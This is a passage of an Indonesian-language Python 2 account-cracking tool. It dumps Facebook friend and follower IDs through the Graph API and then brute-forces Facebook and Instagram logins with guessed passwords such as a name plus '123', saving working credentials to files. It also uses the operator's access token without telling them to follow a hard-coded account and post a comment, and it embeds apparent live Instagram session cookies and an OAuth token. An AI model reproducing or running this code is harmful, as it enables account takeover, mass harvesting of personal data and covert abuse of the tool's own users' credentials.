                        print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Profil Tidak Ditemukan')
                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=9999999")
                id = []
                z=json.loads(r.text)
                fle = open(file , 'a')#.replace(" ","_")
                for a in z['friends']['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
                print("\r\x1b[1;97m                     ")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                menu()

        except KeyError:
                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Follower')
                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
def teman():
        try:
                token=open('___rozhak___','r').read()
        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                os.system('rm -rf ___rozhak___')
                time.sleep(2)
                login()
        try:
		file = raw_input("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                except KeyError:
                        print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
                id = []
                z=json.loads(r.text)
                fle = open(file , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
		print("\r\x1b[1;97m                   ")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Tersimpan :\x1b[1;93m "+file)
                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
def menu():
	global ip, region, org
	try:
		token=open('___rozhak___','r').read()
	except IOError:
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
		os.system('rm -rf ___rozhak___')
		time.sleep(2)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
		os.system('rm -rf ___rozhak___')
		time.sleep(2)
		login()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
	os.system("clear")
	print(logo)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Name : "+nama)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Ip : "+ip)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Org : "+org)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Region : "+region)

	print("\n\x1b[1;97m[\x1b[1;96m1\x1b[1;97m]\x1b[1;96m Crack Instagram (without login)")
	print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Dump ID Publik (dump fast/slow)")
	print("\x1b[1;96m[\x1b[1;97m3\x1b[1;96m]\x1b[1;97m Dump ID From Query (dump slow)")
	print("\x1b[1;96m[\x1b[1;97m4\x1b[1;96m]\x1b[1;97m Dump ID From Pesan (dump slow)")
	print("\x1b[1;96m[\x1b[1;97m5\x1b[1;96m]\x1b[1;97m Dump ID Like Post (dump fast)")
	print("\x1b[1;96m[\x1b[1;97m6\x1b[1;96m]\x1b[1;97m Dump ID From Grup (dump slow)")
	print("\x1b[1;96m[\x1b[1;97m7\x1b[1;96m]\x1b[1;97m Dump ID Follower (dump fast)")
	print("\x1b[1;96m[\x1b[1;97m8\x1b[1;96m]\x1b[1;97m Dump ID Teman (dump fast)")
	print("\x1b[1;97m[\x1b[1;92m9\x1b[1;97m]\x1b[1;92m Start Crack (crack fast)")
	print("\x1b[1;97m[\x1b[1;93m10\x1b[1;97m]\x1b[1;93m Cek Opsi Checkpoint")
	print("\x1b[1;96m[\x1b[1;97m11\x1b[1;96m]\x1b[1;97m Lihat Hasil Crack")
	print("\x1b[1;96m[\x1b[1;97m12\x1b[1;96m]\x1b[1;97m Report Bug")
	print("\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Remove Cookie")
	daftar_menu()
def daftar_menu():
	pilih = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
	if pilih == "":
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif pilih == "1":
		menu_instagram()
	elif pilih == "2":
		fst_slw = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Dump fast\x1b[1;93m/\x1b[1;97mslow :\x1b[1;96m ")
		if fst_slw == "":
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
		elif fst_slw == "f" or fst_slw == "F":
			publik_fast()
		elif fst_slw == "s" or fst_slw == "S":
			friendlist(basecookie())
		else:
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif pilih == "3":
		dumpfl()
		exit()
	elif pilih == "4":
		dump_message(basecookie())
	elif pilih == "5":
		like_post()
	elif pilih == "6":
		dump_grup(basecookie())
	elif pilih == "7":
		follower()
	elif pilih == "8":
		teman()
	elif pilih == "9":
		mbasic()
	elif pilih == "10":
		cek_opsi()
	elif pilih == "11":
		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
		print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;93m Cp")
		print("\x1b[1;96m[\x1b[1;97m0\x1b[1;96m]\x1b[1;97m Kembali")
		lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
		if lihat == "":
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
		elif lihat == "1":
			try:
				live=open('Live.txt','r').read()
			except IOError:
				exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Ok Tidak Ada")
			print("\x1b[1;92m"+live)
			exit()
		elif lihat == "2":
			try:
                                chek=open('Check.txt','r').read()
                        except IOError:
                                exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Cp Tidak Ada")
                        print("\x1b[1;93m"+chek)
			exit()
		elif lihat == "0":
			menu()
		else:
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif pilih == "12":
		print("\x1b[1;92m[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
		time.sleep(3)
		os.system("xdg-open https://wa.me/6285727173376?text=Hallo%20Bang%20Rozhak")
		exit()
	elif pilih == "00":
		try:
			print("\x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Menghapus Cookie & Token")
			os.remove("___rozhak___")
			os.remove("_____rozhak_____")
		except Exception as e:
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
	else:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
def mbasic():
	file = raw_input("\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
	if file == "":
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
	try:
		id=open(file, "r").readlines()
	except IOError:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
	print ("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Total ID :\x1b[1;96m "+str(len(id)))
	print ("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
	def main(arg):
		global loop, ok, cp
		sys.stdout.write(
                        "\r\x1b[1;97m[Crack] %s/%s Ok:%s - Cp:%s "%(loop, len(id), len(ok), len(cp))
                ); sys.stdout.flush()
		user = arg
		uid,name=user.split("<=>")
		xx = name.split(' ')
                if len(xx) == 3 or len(xx) == 4 or len(xx) == 5 or len(xx) == 6:
                        pwx = [name, xx[0]+"123", xx[0]+"1234", xx[0]+"12345", xx[0]+"123456"]
                else:
                        pwx = [name, xx[0]+"123", xx[0]+"1234", xx[0]+"12345", xx[0]+"123456"]
		try:
			for pw in pwx:
				url = 'https://mbasic.facebook.com/login.php'
				headersc = {
				'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF',
				'Accept-Language' : 'en-US,en;q=0.5'
				}
				data = {'email': uid,'pass': pw}
				xox = requests.post(url, headers=headersc, data=data).text
				if 'mbasic_logout_button' in xox or 'save-device' in xox:
					ok.append(uid+"|"+pw)
					open("Live.txt","a").write("%s|%s\n"%(uid, pw))
					print("\r\x1b[1;92m[Live] "+uid+"|"+pw+"             ")
					break
					continue
					continue
				elif "checkpoint" in xox:
					try:
						token = open('___rozhak___','r').read()
                                                q = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                                                qw = json.loads(q.text)
                                                ttl = qw["birthday"]
						ups = qw["updated_time"][:10]
                                                month, day, year = ttl.split("/")
                                                birthday = day+'/'+month+'/'+year
						year, month, day = ups.split("-")
						update = day+"/"+month+"/"+year
                                        except (KeyError, IOError):
                                         birthday = '- '
					 update = '- '
                                        except:pass
					try:
                                                uds = []
                                                token = open('___rozhak___','r').read()
                                                f = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=100000&access_token="+token)
                                                z = json.loads(f.text)
                                                for i in z["data"]:
                                                        uds.append(i['id'])
                                                friend = str(len(uds))
                                        except (KeyError, IOError):
                                         friend = '- '
					except:pass
					try:
                                                udq = []
                                                token = open('___rozhak___','r').read()
                                                k = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit=100000&access_token="+token)
                                                z = json.loads(k.text)
                                                for i in z["data"]:
                                                        udq.append(i['id'])
                                                follower = str(len(udq))
                                        except (KeyError, IOError):
                                         follower = '- '
					except:pass
					cp.append(uid+"|"+pw)
					open("Check.txt","a").write("%s|%s\n"%(uid, pw))
					print("\r\x1b[1;93m[Check] "+uid+"|"+pw+"            ")
					print("\x1b[1;93m[1] Teman : "+friend)
					print("\x1b[1;93m[2] Pengikut : "+follower)
					print("\x1b[1;93m[3] Diperbarui : "+update)
					print("\x1b[1;93m[4] Tanggal Lahir : "+birthday)
					break
					continue
					continue
			loop += 1
		except:
			pass
	p = ThreadPool(30)
    	p.map(main, id)
	os.remove(file)
	exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")

def menu_instagram():
	global ip, region
	try:
                token=open('___rozhak___','r').read()
        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                os.system('rm -rf ___rozhak___')
                time.sleep(2)
                login()
	try:
                otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/10159494942223544/comments/?message=Pengguna Script Crack Instagram ❤️&access_token='+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
		os.system('rm -rf ___rozhak___')
		time.sleep(2)
		login()
	os.system("clear")
	print(logo)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Ip : "+ip)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Nama : "+nama)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Region : "+region)

	print("\n\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Crack Dari Username Huruf+Angka")
	print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Crack Dari Username Huruf_Angka")
	print("\x1b[1;96m[\x1b[1;97m3\x1b[1;96m]\x1b[1;97m Crack Dari Email Nama+Angka")
	print("\x1b[1;96m[\x1b[1;97m4\x1b[1;96m]\x1b[1;97m Crack Dari Email Huruf")
	print("\x1b[1;96m[\x1b[1;97m5\x1b[1;96m]\x1b[1;97m Crack Dari Email Angka")
	print("\x1b[1;96m[\x1b[1;97m6\x1b[1;96m]\x1b[1;97m Crack Dari Query V1")
	print("\x1b[1;96m[\x1b[1;97m7\x1b[1;96m]\x1b[1;97m Crack Dari Query V2")
	print("\x1b[1;97m[\x1b[1;93m0\x1b[1;97m]\x1b[1;93m Kembali")
	menu=raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
	if menu == "":
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif menu == "1":
		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(1000):
                        number=random.randint(1, 999)
                        user=(nama+str(number))
			crack(user,pw)
	elif menu == "2":
                nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(100):
                        number=random.randint(1, 99)
                        user=(nama+"_"+str(number))
                        crack(user,pw)
	elif menu == "3":
		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
                tipe=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m ")
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(1000):
                        number=random.randint(1, 999)
                        email=(nama+str(number)+tipe)
                        crack(email,pw)
	elif menu == "4":
                tipe=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(1500):
                        low = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b=random.randint(0,7)
                        low1 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b1=random.randint(0,7)
                        low2 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b2=random.randint(0,7)
                        low3 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b3=random.randint(0,7)
                        low4 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b4=random.randint(0,7)
                        low5 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b5=random.randint(0,7)
                        x=(low[b])
                        x1=(low1[b1])
                        x2=(low2[b2])
                        x3=(low3[b3])
                        x4=(low4[b4])
                        x5=(low5[b5])
                        count=random.choice([x+x1+x2,x+x1+x2+x3,x+x1+x2+x3+x4,x+x1+x2+x3+x4+x5])
                        huruf=(count)
                        email=(huruf+tipe)
                        pw=(huruf+"123")
                        crack(email,pw)
	elif menu == "5":
		domain=("@gmail.com")
                print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m "+domain)
                print("\x1b[1;97m ")
                for i in range(1500):
                        number=random.randint(111111, 999999)
                        em_angka=(str(number)+domain)
                        pw=(str(number))
                        crack(em_angka,pw)
	elif menu == "6":
		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                query().getquery(nama,pw)
	elif menu == "7":
		query_v2()
	elif menu == "8":
		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
                print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m] Lihat Hasil\x1b[1;93m Cp")
                print("\x1b[1;97m[\x1b[1;93m0\x1b[1;97m]\x1b[1;93m Kembali")
                lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
                if lihat == "":
                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
                elif lihat == "1":
                        try:
                                ok=open('Insta_Ok.txt','r').read()
                        except IOError:
                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Ok Tidak Ada")
                        print("\x1b[1;92m"+ok)
                elif lihat == "2":
                        try:
                                cp=open('Insta_Cp.txt','r').read()
                        except IOError:
                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Cp Tidak Ada")
                        print("\x1b[1;93m"+cp)
                elif lihat == "0":
                        menu_instagram()
                else:
                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif menu == "0":
		menu()
	else:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
def crack(username, password):
	print'\r\x1b[1;97m[Crack] Ok:%s - Cp:%s - Die:%s' % (len(live), len(chek), len(die)),
	sys.stdout.flush()
	url = "https://www.instagram.com/"
	sesi = requests.Session()
	header = {
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-US,en;q=0.8',
		'Connection': 'keep-alive',
		'Content-Length': '0',
		'Host': 'www.instagram.com',
		'Referer': 'https://www.instagram.com/',
		'User-Agent': useragent,
		'X-Instagram-AJAX': '1',
		'X-Requested-With': 'XMLHttpRequest'
	}
	sesi.headers.update(header)
	sesi.cookies.update({
		'sessionid': '', 'mid': '', 'ig_pr': '1',
		'ig_vw': '1920', 'csrftoken': '',
		's_network': '', 'ds_user_id': ''
	})
	sesi.get('https://www.instagram.com/web/__mid')
	sesi.headers.update({'X-CSRFToken': sesi.cookies.get_dict()['csrftoken']})
	enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), password)
	data_post = {
		"username": username,
		"enc_password": enc_pass
	}
	try:
		req = sesi.post("https://www.instagram.com/accounts/login/ajax/", data=data_post, allow_redirects=True).json()
		if req["authenticated"] == True:
			print("\r\x1b[1;92m[Ok] "+username+"|"+password+"         ")
			live.append(username+"|"+password)
			save=open("Insta_Ok.txt", "a")
			save.write(username+"|"+password+"\n")
			save.close()
		else:
			die.append(username+""+password)
	except KeyError:
		if "Please wait" in req["message"]:
			print("\r\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Crack Limit Silahkan Tunggu Sebentar...")
			time.sleep(120)
		else:
			print("\r\x1b[1;93m[Cp] "+username+"|"+password+"          ")
			chek.append(username+"|"+password)
			save=open("Insta_Cp.txt", "a")
                        save.write(username+"|"+password+"\n")
                        save.close()
class query:
	def getquery(self, search, password):
		url = link+"/search/"+search
		getData = requests.get(url, headers={"user-agent": useragent}).text
		htmlBeauti = parser(getData, "html.parser")
		for username in htmlBeauti.find_all("div", class_="result-username"):
			userid = username.text.replace("@","")
			crack(userid, password)
head = {
'HOST': "www.instagram.com",
'KeepAlive' : 'True',
'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
'Cookie': 'mid=YSnwAwABAAGcP8U__eZOXNfoDJdA; ig_did=5C47028B-01A6-40CF-A8CB-0C22E54A0D37; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; fbsr_124024574287414=TFQpfhizsCMxS9eNZynAdlP7E5xwyP0dqHvPagKil2E.eyJ1c2VyX2lkIjoiMTAwMDM2NTA2MTk4NjI4IiwiY29kZSI6IkFRQTYwMWNpd0VTSXVuQ1hITldyTHlKR1JjMEFySGtQMm1WWVoxbWxwdDQtWkhjQkhJR1JrZFJsZ2dnX3FHWURib2xvbkxzbDA5VnNvYi0zTzc2UjI4ZFR3ZHMzc1VmazBzbnQwNF9HLUw5bWNXQ1d6czFSREQ3N3JmeXVVdGVwaXZ0RGVoZFhPNXBCTGVpcU1ZZHhSU2FKSE9fSExJX0ZqOHlKWWVMWmdHMmdRNlNKZTJnUHpxa3Z4RFVralFPdEhTaWUtTDNNTHdFRS1SbGpveEJCNm5abnNlYTRTUE95Z0xzQ2RlRlhSZXBDWnNBV1ZqbmZDZFo1NUk4VWtCVDNkbUxScEVJdURnZTBOX2RwbzA4aVppTVFPUU8yVHhKeFdERk1kWE8tS296cUowbFpzLWdQV3Vvb0R1WGk0UHp1b1NFbWU0aE8yMHdVNTkxM0hETFQ5em9tIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxLNWNmc0VuZktzM0k0OVQxRFpBdjlISzY3a2VBY3VTS2xIOHBNaGMxeFJnektveklvd1BXdFZqQkpBWkNnZ1A3Y09GZXlyTGN6NWpjeDBIY0VXUlBkcXlYWkFHajFJQkUzWkM3REVhUXBHMjZEV2FQWkFFNXlFcWxsdjZKbzNySHN0TjRNWDE4T2ZMNVNZWkNJWkJjakVsSjhaQlNJajM3c0Q3S2lPUnVXRkcyQXlKR0htYnF0amMxdElaQXZhU3JBWkRaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjMxOTI3MzkxfQ; ds_user_id=14958828655; csrftoken=UvDJ8XTfXCNQ2qnmoRui10iLQETDX2W3; sessionid=14958828655%3AAJmi00Y476z5Hj%3A12; shbid="9776\05414958828655\0541663463393:01f7181afc78a3771c0c86d394d5b2965ee08f264fd795effa6578839bd3b7cc51ff0a62"; shbts="1631927393\05414958828655\0541663463393:01f7e6f65ebf92959d2b7851ec21c720d4c0fb15c10ed2ef19aa3f07370fba0de34a7300"; rur="EAG\05414958828655\0541663472958:01f767d0ebf0d584e79b15a13262eaa8c14a66e16073dd934e41645a537fa8ae1174dff5"',
'Accept' : "*/*",
'ContentType' : "application/x-www-form-urlencoded",
"X-Requested-With" : "XMLHttpRequest",
"X-IG-App-ID": "936619743392459",
"X-Instagram-AJAX" : "missing",
"X-CSRFToken" : "missing",
"Accept-Language" : "en-US,en;q=0.9"
}
def query_v2():
        try:
                query=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
                pw =raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
		print("\x1b[1;97m ")
		ruks = requests.Session()
                url_id = 'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.'+query
                mn = 0
                req_id = ruks.get(url_id,headers=head).json()
                while True:
                        mn+=1
                        y = str(req_id['users'][mn]['user']['username'])
                        crack(y,pw)
        except Exception as e:
		print("\n\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Dump Limit Crack Selesai...")

if __name__=='__main__':
	cek_cookie()
